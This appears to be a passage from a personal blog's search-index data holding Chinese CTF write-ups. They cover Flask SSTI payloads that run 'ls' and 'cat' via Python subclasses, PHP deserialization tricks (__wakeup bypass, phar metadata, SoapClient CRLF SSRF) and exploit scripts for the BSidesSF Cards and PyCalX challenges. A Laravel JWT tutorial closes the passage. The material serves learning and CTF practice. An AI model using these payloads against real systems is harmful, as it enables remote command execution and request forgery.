12345?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; 得到flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"},{"name":"FLaskSSTI","slug":"FLaskSSTI","permalink":"https://yanmymickey.github.io/tags/FLaskSSTI/"}]},{"title":"PHP反序列化","date":"2020-04-13T16:00:00.000Z","path":"2020/04/14/CTF/PHP反序列化漏洞/","text":"PHP反序列化魔术方法PHP魔术方法 1、__sleep() serialize()函数会检查类中是否存在一个魔术方法 __sleep()。 如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 2、__wake() unserialize()会检查是否存在一个 __wakeup()方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 __wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 3、__construct() PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。 如果子类中定义了构造函数则不会隐式调用其父类的构造函数。要执行父类的构造函数，需要在子类的构造函数中调用 **parent::__construct()**。如果子类没有定义构造函数则会如同一个普通的类方法一样从父类继承（假如没有被定义为 private 的话）。 4、__destruct () PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 5、__toString() __toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 需要指出的是在 PHP 5.2.0 之前，__toString()方法只有在直接使用于 echo 或 print 时才能生效。 PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 printf()，使用 %s 修饰符），但不能用于非字符串环境（如使用 %d 修饰符）。 自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 E_RECOVERABLE_ERROR 级别的错误。 6、__invoke() 当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。 示例 1234567891011121314&lt;?phpclass CallableClass &#123; function __invoke($x) &#123; var_dump($x); &#125;&#125;$obj &#x3D; new CallableClass;$obj(5);var_dump(is_callable($obj));?&gt;&#x2F;&#x2F;样例输出 int(5)bool(true) 7、__call()和__callStatic() 方法重载 在对象中调用一个不可访问方法时，__call() 会被调用 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用 $name参数是要调用的方法名称。$arguments参数是一个枚举数组，包含着要传递给方法 $name 的参数。 8、__set() __get() __isset() __unset 在给不可访问属性赋值时，__set() 会被调用。 读取不可访问属性的值时，__get() 会被调用。 当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 当对不可访问属性调用 unset() 时，__unset() 会被调用。 参数 $name 是指要操作的变量名称。__set() 方法的 $value 参数指定了 $name变量的值。 属性重载只能在对象中进行。在静态方法中，这些魔术方法将不会被调用。所以这些方法都不能被声明为 static。从 PHP 5.3.0 起, 将这些魔术方法定义为 static 会产生一个警告。 9、__set_state() 自 PHP 5.1.0 起当调用 var_export()导出类时，此静态方法会被调用。 本方法的唯一参数是一个数组，其中包含按 array(‘property’ =&gt; value, …) 格式排列的类属性。 示例 123456789101112131415161718192021222324252627282930&lt;?phpclass A&#123; public $var1; public $var2; public static function __set_state($an_array)&#123; &#x2F;&#x2F; As of PHP 5.1.0 $obj &#x3D; new A; $obj-&gt;var1 &#x3D; $an_array[&#39;var1&#39;]; $obj-&gt;var2 &#x3D; $an_array[&#39;var2&#39;]; return $obj; &#125;&#125;$a &#x3D; new A;$a-&gt;var1 &#x3D; 5;$a-&gt;var2 &#x3D; &#39;foo&#39;;eval(&#39;$b &#x3D; &#39; . var_export($a, true) . &#39;;&#39;); &#x2F;&#x2F; $b &#x3D; A::__set_state(array(&#x2F;&#x2F; &#39;var1&#39; &#x3D;&gt; 5,&#x2F;&#x2F; &#39;var2&#39; &#x3D;&gt; &#39;foo&#39;,&#x2F;&#x2F; ));var_dump($b);&#x2F;&#x2F;以上样例会输出：object(A)#2 (2) &#123; [&quot;var1&quot;]&#x3D;&gt; int(5) [&quot;var2&quot;]&#x3D;&gt; string(3) &quot;foo&quot;&#125; 10、__clone() 当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。 当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的__clone()方法会被调用，可用于修改属性的值（如果有必要的话） 示例 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass SubObject&#123; static $instances &#x3D; 0; public $instance; public function __construct() &#123; $this-&gt;instance &#x3D; ++self::$instances; &#125; public function __clone() &#123; $this-&gt;instance &#x3D; ++self::$instances; &#125;&#125;class MyCloneable&#123; public $object1; public $object2; function __clone()&#123; &#x2F;&#x2F; 强制复制一份this-&gt;object， 否则仍然指向同一个对象 $this-&gt;object1 &#x3D; clone $this-&gt;object1; &#125;&#125;$obj &#x3D; new MyCloneable();$obj-&gt;object1 &#x3D; new SubObject();$obj-&gt;object2 &#x3D; new SubObject();$obj2 &#x3D; clone $obj;print(&quot;Original Object:\\n&quot;);print_r($obj);print(&quot;Cloned Object:\\n&quot;);print_r($obj2);?&gt; 1234567891011121314151617181920212223242526272829303132&#x2F;&#x2F;以上样例会输出Original Object:MyCloneable Object( [object1] &#x3D;&gt; SubObject Object ( [instance] &#x3D;&gt; 1 ) [object2] &#x3D;&gt; SubObject Object ( [instance] &#x3D;&gt; 2 ))Cloned Object:MyCloneable Object( [object1] &#x3D;&gt; SubObject Object ( [instance] &#x3D;&gt; 3 ) [object2] &#x3D;&gt; SubObject Object ( [instance] &#x3D;&gt; 2 ))&#x2F;&#x2F;原始类经过克隆后&#x2F;&#x2F;object1对象instance属性的值自增了1次,触发了__clone()方法,达到了修改属性值的目的&#x2F;&#x2F;object2对象instance属性的值只是简单复制.仍然指向原来对象 小结 构造函数 __construct 对象被创建的时候调用 析构函数 __destruct 对象被销毁的时候调用 方法重载 __call 在对象中调用一个不可访问方法时调用 方法重载 __callStatic 在静态上下文中调用一个不可访问方法时调用 在给不可访问属性赋值时，__set() 会被调用。 读取不可访问属性的值时，__get() 会被调用。 当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用 当对不可访问属性调用 unset() 时，__unset() 会被调用 __sleep() 在serialize() 函数执行之前调用 __wakeup() 在unserialize() 函数执行之前调用 __toString 在一个类被当成字符串时被调用（不仅仅是echo的时候,比如file_exists()判断也会触发 例题源码1234567891011121314151617181920212223242526&#x2F;&#x2F;index.php&lt;?php require_once(&#39;shield.php&#39;); $x &#x3D; new Shield(); isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;]; if (!empty($g)) &#123; $x &#x3D; unserialize($g); &#125; echo $x-&gt;readfile();?&gt;&#x2F;&#x2F;shield.php&lt;?php &#x2F;&#x2F;flag is in flag.php class Shield &#123; public $file; function __construct($filename &#x3D; &#39;&#39;) &#123; $this -&gt; file &#x3D; $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\\\&#39;)&#x3D;&#x3D;FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 分析传入一个参数class,class赋值给$g,然后对g进行反序列化 利用的对象是Shield,两个方法,__construct在对象被创建时调用,这里并没有创建对象,这里不需要创建对象,所以反序列化不会触发该方法 123456class Shield &#123; public $file&#x3D;&quot;flag.php&quot;;&#125;$a&#x3D;new Shield();echo serialize($a);&#x2F;&#x2F;将输出值传过去即可读取flag文件得到flag","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"}]},{"title":"PHP反序列化绕过姿势","date":"2020-04-13T16:00:00.000Z","path":"2020/04/14/CTF/PHP反序列化绕过姿势/","text":"PHP反序列化绕过姿势访问控制 12345678910&lt;?phpclass test&#123; private $test1&#x3D;&quot;hello&quot;; public $test2&#x3D;&quot;hello&quot;; protected $test3&#x3D;&quot;hello&quot;;&#125;$test &#x3D; new test();echo serialize($test); &#x2F;&#x2F;输出到控制台是这样的O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125; 但是其实结果不是这样的 1&#123;s:11:&quot;\\00test\\00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;\\00*\\00test3&quot;;s:5:&quot;hello&quot;;&#125; 结果是这样的,只是因为\\00是空字符在控制台不显示 仔细观察,s:后面的数字,后属性名是不匹配的,说明有些字符没有显示,就是空字符 如果在url传参中就需要将\\00编码称%00进行传参 比如上述传参就需要 1?a&#x3D;&#123;s:11:&quot;%00test%00test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot;%00*%00test3&quot;;s:5:&quot;hello&quot;;&#125; __wakeup()序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,并且不会报错,可以被正常反序列化 1234567891011121314151617class test &#123; public $a&#x3D;&quot;flag&#123;test&#125;&quot;; function __wakeup () &#123; &#x2F;&#x2F; TODO: Implement __wakeup() method. $this-&gt;a&#x3D;&quot;no&quot;; &#125; function __destruct () &#123; &#x2F;&#x2F; TODO: Implement __destruct() method. echo $this-&gt;a; &#125;&#125;$a&#x3D;&quot;O:4:\\&quot;test\\&quot;:1:&#123;s:1:\\&quot;a\\&quot;;s:10:\\&quot;flag&#123;test&#125;\\&quot;;&#125;&quot;;$b &#x3D; unserialize($a);&#x2F;&#x2F;输出no 当我们正常传入一个序列化字符串时,会触发__wakeup(),只能输出no 但是当传入的属性值大于真实的属性值时,就会正常输出flag 1234$a&#x3D;&quot;O:4:\\&quot;test\\&quot;:1:&#123;s:1:\\&quot;a\\&quot;;s:10:\\&quot;flag&#123;test&#125;\\&quot;;&#125;&quot;;$b &#x3D; unserialize($a);&#x2F;&#x2F;输出flag&#123;test&#125; 注意：该漏洞在PHP7.3.0是不能复现成功的 PHP7.3.0版本中并没有出现类似PHP5.6的调用过程，只是做了简单的标记，整个魔法函数的调用过程的时机移至释放数据处。这样就避免了这个绕过的问题 ReferencePHP 内核层解析反序列化漏洞—绕过__wakeup()","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"}]},{"title":"PHP常见反序列化漏洞","date":"2020-04-13T16:00:00.000Z","path":"2020/04/14/CTF/PHP常见反序列化漏洞/","text":"PHP常见反序列化漏洞Session反序列化漏洞Session序列化机制Session是以序列化字符串的形式存储在文件中的,读取Session是一个反序列化的过程,那么就有可能出现反序列化漏洞 当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp） PHP处理器的三种序列化方式： 处理器 存储方式 php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 php 键名＋竖线＋经过serialize()函数反序列处理的值 php_serialize serialize()函数反序列处理数组方式 php.ini中含有几个与session存储配置相关的配置项： 123session.save_path&#x3D;&quot;&quot; --设置session的存储路径,默认在&#x2F;tmpsession.auto_start --指定会话模块是否在请求开始时启动一个会话,默认为0不启动session.serialize_handler --定义用来序列化&#x2F;反序列化的处理器名字。默认使用php 简要分析当由于处理session的处理器不同时就可以触发反序列化漏洞 处理器是php时,是以|后为反序列化内容的,而用php_serialize存储的session如果没有过滤|字符就会导致php处理器将后面的内容反序列化,达到反序列化成对象的目的 phar伪协议触发反序列化phar://协议可以将多个文件归入一个本地文件夹，也可以包含一个文件 phar文件PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。 安装phar扩展然后在php.ini中设置phar.readonly=off或0才可以使用phar对象创建phar文件 phar文件结构Phar官方文档 1、a stub识别phar拓展的标识，格式:xxx。对应的函数Phar::setStub 2、a manifest describing the contents被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用的核心部分。对应函数Phar::setMetadata—设置phar归档元数据 3、 the file contents被压缩文件的内容。 4、[optional] a signature for verifying Phar integrity (phar file format only)签名，放在文件末尾。对应函数Phar :: stopBuffering —停止缓冲对Phar存档的写入请求，并将更改保存到磁盘 Phar内置方法12345$phar &#x3D; new Phar(&#39;phar&#x2F;hpdoger.phar&#39;); &#x2F;&#x2F;实例一个phar对象供后续操作$phar-&gt;startBuffering() &#x2F;&#x2F;开始缓冲Phar写操作$phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo &#39;this is test file&#39;;&#39;); &#x2F;&#x2F;以字符串的形式添加一个文件到 phar 档案$phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) &#x2F;&#x2F;把一个目录下的文件归档到phar档案$phar-&gt;extractTo() &#x2F;&#x2F;解压一个phar包的函数，extractTo 提取phar文档内容 demo123456789101112131415161718192021222324252627&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub $o &#x3D; new TestObject(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件 $phar-&gt;stopBuffering();&#x2F;&#x2F;签名自动计算&#x2F;&#x2F;创建phar文件&lt;?php class TestObject &#123; public function __destruct() &#123; echo &#39;Destruct called&#39;; &#125; &#125; $filename &#x3D; &#39;phar:&#x2F;&#x2F;phar.phar&#x2F;test.txt&#39;; file_get_contents($filename); &#x2F;&#x2F;利用页面&#x2F;&#x2F;输出Destruct called&#x2F;&#x2F;所以达到了反序列化TestObject对象的目的 将phar伪造成其他格式的文件php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。 123456789101112131415&lt;?php class TestObject &#123; &#125; @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头 $o &#x3D; new TestObject(); $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件 &#x2F;&#x2F;签名自动计算 $phar-&gt;stopBuffering();?&gt;&#x2F;&#x2F;生成的phar文件会被文件头检测为GIF 使用php内置类进行反序列化攻击PHP内置类12345678910111213141516171819202122$classes &#x3D; get_declared_classes();foreach ($classes as $class) &#123; $methods &#x3D; get_class_methods($class); foreach ($methods as $method) &#123; if (in_array($method, array( &#39;__destruct&#39;, &#39;__toString&#39;, &#39;__wakeup&#39;, &#39;__call&#39;, &#39;__callStatic&#39;, &#39;__get&#39;, &#39;__set&#39;, &#39;__isset&#39;, &#39;__unset&#39;, &#39;__invoke&#39;, &#39;__set_state&#39; ))) &#123; print $class . &#39;::&#39; . $method . &quot;\\n&quot;; &#125; &#125;&#125;&#x2F;&#x2F;输出结果为php中内置的类及方法 SoapClient__call方法正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法 123456&lt;?php$a &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&#39;bbb&#39;, &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;ip:port&#x2F;path&#39;));$b &#x3D; serialize($a);echo $b;$c &#x3D; unserialize($b);$c-&gt;not_exists_function(); 在服务器或者虚拟机开启nc监听端口,就会收到SoapClient对象的http请求,携带着一段xml文本 SOAPAction处可控，可以把\\x0d\\x0a注入到SOAPAction，POST请求的header就可以被控制 123456&lt;?php$a &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&quot;bbb\\r\\n\\r\\nccc\\r\\n&quot;, &#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;ip:port&#x2F;path&#39;));$b &#x3D; serialize($a);echo $b;$c &#x3D; unserialize($b);$c-&gt;not_exists_function(); 但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据 在header里User-Agent在Content-Type前面 user_agent同样可以注入CRLF，控制Content-Type的值 1234567891011121314151617&lt;?php$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:5555&#x2F;path&#39;;$post_string &#x3D; &#39;data&#x3D;something&#39;;$headers &#x3D; array( &#39;X-Forwarded-For: 127.0.0.1&#39;, &#39;Cookie: PHPSESSID&#x3D;my_session&#39; );$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));$aaa &#x3D; serialize($b);$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\\r\\n&quot;,$aaa);$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c &#x3D; unserialize($aaa);$c-&gt;not_exists_function();?&gt; 如上，使用SoapClient反序列化+CRLF可以生成任意POST请求。 Deserialization + __call + SoapClient + CRLF = SSRF CTF题目n1ctf2018 easy_harder_php [SUCTF-2019 Upload Labs 2](https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload Labs 2) Reference四个实例递进php反序列化漏洞理解 利用 phar 拓展 php 反序列化漏洞攻击面 PHP反序列化入门之phar","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"}]},{"title":"[BSidesSF 2020]Cards","date":"2020-04-07T16:00:00.000Z","path":"2020/04/08/CTF_WP/[BSidesSF 2020]Cards/","text":"[BSidesSF 2020]Cards分析21点游戏,查看rules,21点3:2,下注最多500,所以每次最多赢750要赚到100000 随便试一下,有一个初始化的/api获取初始金钱和secretstate /api/deal下注 要达到的目的,利用获取新的secretstate,旧的没有失效的达到一直赚钱的效果 exp12345678910111213141516171819202122import requestsimport timestart &#x3D; &quot;http:&#x2F;&#x2F;bd6d39d5-cd91-4bb9-b2ef-e753aa13f02d.node3.buuoj.cn&#x2F;api&quot;deal &#x3D; start + &quot;&#x2F;deal&quot;#开始state &#x3D; requests.post(start).json()[&quot;SecretState&quot;]while True: try: #下注 result &#x3D; requests.post(deal, json&#x3D;&#123;&quot;Bet&quot;: 500, &quot;SecretState&quot;: state&#125;).json() except: print(result) continue time.sleep(0.1) if result[&#39;GameState&#39;] &#x3D;&#x3D; &#39;Blackjack&#39;: #赢了就换SecretState state &#x3D; result[&#39;SecretState&#39;] print(result[&#39;Balance&#39;]) if result[&#39;Balance&#39;] &gt; 100000: print(result) break","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"PyCalX 1和2","date":"2020-04-07T16:00:00.000Z","path":"2020/04/08/CTF_WP/PyCalX 1和2/","text":"PyCalX 1和2分析首先是1,审计源码,souce可控,模拟sql注入改变操作 exp12345678910111213141516171819202122232425262728293031323334353637383940import requestsimport timeurl &#x3D; &#39;http:&#x2F;&#x2F;44f679f2-1772-4584-b810-90c98139efc8.node3.buuoj.cn&#x2F;&#39;flag &#x3D; &#39;flag&#123;&#39;url &#x3D; url + &quot;cgi-bin&#x2F;pycalx.py&quot;while True: high &#x3D; 127 low &#x3D; 1 mid &#x3D; (high + low) &#x2F;&#x2F; 2 while high &gt; low: tmp &#x3D; flag + chr(mid) data &#x3D; &#123; &#39;value1&#39;: &#39;a&#39;, &#39;op&#39;: &#39;+\\&#39;&#39;, &#39;value2&#39;: &#39;and FLAG&gt;source#&#39;, &#39;source&#39;: tmp &#125; data2&#x3D;&#123; &#39;value1&#39;:&#39;Tru&#39;, &#39;op&#39;:&#39;+f&#39;, &#39;value2&#39;:&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;, &#39;source&#39;:tmp &#125; r &#x3D; requests.get(url, data) print(chr(mid), end&#x3D;&quot;&quot;) if r.status_code &#x3D;&#x3D; 200: if &#39;True&#39; in r.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (high + low) &#x2F;&#x2F; 2 else: time.sleep(1) flag +&#x3D; chr(mid-1) print(&quot; | flag&#x3D;&quot;+flag) if &quot;&#125;&quot; in flag: breakprint(&quot;flag&#x3D;&quot;+flag) 分析然后是2,进一步过滤了&#39;&#39;所以利用python3的F-strings 1234&#39;value1&#39;:&#39;Tru&#39;,&#39;op&#39;:&#39;+f&#39;,&#39;value2&#39;:&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;,&#39;source&#39;:&#39;flag&#123;a&#39; 利用python3.6以后的特性f&#39;&#123;中间可以加表达式&#125;&#39;,当source为FLAG中字符时输出为Tru+101:c(就是字符e)组合成True,表示结果为false时输出Truf,再print会触发异常然后就会输出Invalid 然后就可以改变表达式来盲注,但是最终并没有复现出来 线上测试都为Invalid 本地测试 12345678910111213141516FLAG &#x3D; &quot;flag&#123;test&#125;&quot;source &#x3D; &quot;fla&quot;try: result &#x3D; str(eval(&#39;Tru&#39;+f&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;)) if result.isdigit() or result &#x3D;&#x3D; &#39;True&#39; or result &#x3D;&#x3D; &#39;False&#39;: print(result) else: print(&quot;Invalid&quot;) # Sorry we don&#39;t support output as a string due to security issue. print(1)except: print(&quot;Invalid&quot;) print(2)#输出结果为&#96;True&#96;#当source&#x3D;&quot;flb&quot;时输出为#Invalid#2","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"Laravel使用JWT","date":"2020-04-01T16:00:00.000Z","path":"2020/04/02/Note/laravel使用jwt/","text":"Laravel使用JWT前言laravel使用JWT有两种方法,一中是使用内置的Auth结合JWT定义的中间件进行认证,这种方法laravel社区有很多教程,这里不再细说，谈谈如何使用自定义JWT来完成用户认证 JWT-oath安装123#使用composer安装jwt-oath扩展#当然也可以写进composer.json文件中composer require tymon&#x2F;jwt-auth 生成加密密匙123# 这条命令会在 .env 文件下生成一个加密密钥，如：JWT_SECRET&#x3D;foobar#注意.env文件默认是不会上传git的,为了你的同伴也可以正常使用认证,需要在.env.example中手动添加相同的字段php artisan jwt:secret 注册两个 Facade这两个 Facade 并不是必须的，但是使用它们会给你的代码编写带来一点便利。 config/app.php 123456&#39;aliases&#39; &#x3D;&gt; [ ... &#x2F;&#x2F; 添加以下两行 &#39;JWTAuth&#39; &#x3D;&gt; &#39;Tymon\\JWTAuth\\Facades\\JWTAuth&#39;, &#39;JWTFactory&#39; &#x3D;&gt; &#39;Tymon\\JWTAuth\\Facades\\JWTFactory&#39;,], 修改 auth.phpconfig/auth.php 1234567891011&#39;guards&#39; &#x3D;&gt; [ &#39;web&#39; &#x3D;&gt; [ &#39;driver&#39; &#x3D;&gt; &#39;session&#39;, &#39;provider&#39; &#x3D;&gt; &#39;users&#39;, ], &#39;api&#39; &#x3D;&gt; [ &#39;driver&#39; &#x3D;&gt; &#39;jwt&#39;, &#x2F;&#x2F; 原来是 token 改成jwt &#39;provider&#39; &#x3D;&gt; &#39;users&#39;, ],], 处理流程 使用方法生成123456789101112&lt;?php&#x2F;&#x2F;自定义的载荷填充$customClaims &#x3D; [ &#39;iss&#39; &#x3D;&gt; &quot;http:&#x2F;&#x2F;market.sky31.com&quot;, &#39;share&#39; &#x3D;&gt; md5($stu_id), ];&#x2F;&#x2F;利用JWT工厂类生成根据自定义的载荷生成payload$payload &#x3D; \\JWTFactory::customClaims($customClaims)-&gt;make();&#x2F;&#x2F;调用Auth类的encode方法就可以生成token$token &#x3D; \\JWTAuth::encode($payload);&#x2F;&#x2F;注意,此处的token是一个类,如何直接添加进response()-&gt;json()中将会报错,所以强制转换为String便可以当成字符床正常使用了return (string)$token; 验证1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php&#x2F;&#x2F;认证可以写在中间件中&#x2F;&#x2F;首部use添加JWT的所有异常类use Tymon\\JWTAuth\\Exceptions\\JWTException;use Tymon\\JWTAuth\\Exceptions\\TokenExpiredException;use Tymon\\JWTAuth\\Exceptions\\TokenInvalidException;&#x2F;&#x2F;一定要使用try catch版快来验证token,token的验证失败,过期等等异常都是throw一个异常,不捕获异常程序直接死掉了,且错误信息不可以定义,就会导致代码不严谨try &#123; &#x2F;&#x2F;定义一个Auth类来验证token,首先将传过来的token绑定在类中 $token &#x3D; \\JWTAuth::setToken($data[&#39;token&#39;]); &#x2F;&#x2F;调用以下方法可以获取token中载荷的数据来使用 $user_id&#x3D;$token-&gt;payload()-&gt;get()[&#39;user_id&#39;]; &#x2F;&#x2F;验证token,正确就会取出其中的载荷返回一个只含有载荷的对象, &#x2F;&#x2F;失败就会抛出异常,失败的原因有许多,过期,数据格式不对,整个JWT过期 $token-&gt;checkOrFail(); &#x2F;&#x2F;还有一个$token()-&gt;check方法可以验证token,返回值为bool,验证失败不会抛出异常而是返回false &#x2F;&#x2F;捕获过期异常然后去刷新过期时间&#125; catch (TokenExpiredException $e) &#123; try &#123; &#x2F;&#x2F;刷新token,返回值是更新过期时间的新token $new_token&#x3D;$token-&gt;refresh(); &#x2F;&#x2F;更新数据库中的token $user&#x3D; User::query()-&gt;where(&#39;user_id&#39;,$user_id)-&gt;first(); $user-&gt;token&#x3D;$new_token; $user-&gt;save(); &#x2F;&#x2F;将新token设置在request的参数中传给下一个路由 $request-&gt;request-&gt;set(&quot;token&quot;,$new_token); &#x2F;&#x2F;如果刷新不了,也过期了就返回错误码让用户重新登录 &#125;catch (TokenExpiredException $e)&#123; &#x2F;&#x2F;msg是我自定义的用来返回json的,不用管 return msg(3,__LINE__); &#125; &#x2F;&#x2F;token格式错误&#125; catch (TokenInvalidException $e) &#123; return msg(403,$e-&gt;getMessage());&#125;catch (JWTException $e) &#123; return msg(403,$e-&gt;getMessage());&#125;&#x2F;&#x2F;将request传给下下一个路由,到这里认证便成功了return $next($request); 说明JWT-oath扩展会在config目录下生成一个jwt.php,里面定义了JWT的相关配置 **注意:**这个扩展有两种过期方式,一种的token有效期,时间短,过期了需要刷新,一种是刷新有效期,时间长,只要在有效期内拿不在黑名单的旧token来刷新就可以,时间一长一短可以一定程度上防止token盗用 常用配置 123456789101112131415161718&#x2F;&#x2F;jwt有效期,默认是60分钟,单位是分钟JWT_TTL &#x2F;&#x2F;jwt的刷新有效期,单位是分钟,默认是20160(14天)JWT_REFRESH_TTL&#x2F;&#x2F;注意以上两个时间不可以用60*24这种格式,需要设置为120这样的整数&#x2F;&#x2F;必须填充的载荷,在你自己设定载荷的时候必须全部手动填充,不然会报错,无法生成,不想自定义的可以注释掉 &#39;required_claims&#39; &#x3D;&gt; [ &#39;iss&#39;,&#x2F;&#x2F; &#39;iat&#39;,&#x2F;&#x2F; &#39;exp&#39;,&#x2F;&#x2F; &#39;nbf&#39;,&#x2F;&#x2F; &#39;sub&#39;,&#x2F;&#x2F; &#39;jti&#39;, ], &#x2F;&#x2F;iss默认是使用用于请求的api路径&#x2F;&#x2F;设置黑名单,当为false时,刷新后生成新token,旧token仍然可以用&#x2F;&#x2F;true验证时就会抛出黑名单异常信息blacklist_enabled 